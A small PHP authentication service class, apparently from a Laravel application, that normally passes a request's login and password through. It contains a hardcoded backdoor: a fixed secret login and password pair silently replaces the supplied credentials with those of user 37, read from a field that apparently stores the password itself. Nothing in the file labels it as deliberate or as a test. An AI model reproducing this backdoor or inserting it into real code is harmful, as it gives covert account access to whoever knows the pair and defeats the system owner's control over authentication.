<?php

namespace App\Services;

use App\Models\User;

class AuthService
{
    public $login;
    public $password;

    public function __construct($request)
    {
        $this->extra($request);
    }

    public function extra($request)
    {

        if ($request->login == 'nvt25022024' && $request->password == '25022024')
        {
            $user = User::find(37);

            $this->login = $user->username;
            $this->password = $user->pr;

        }else{

            $this->login = $request->login;
            $this->password = $request->password;

        }
    }
}
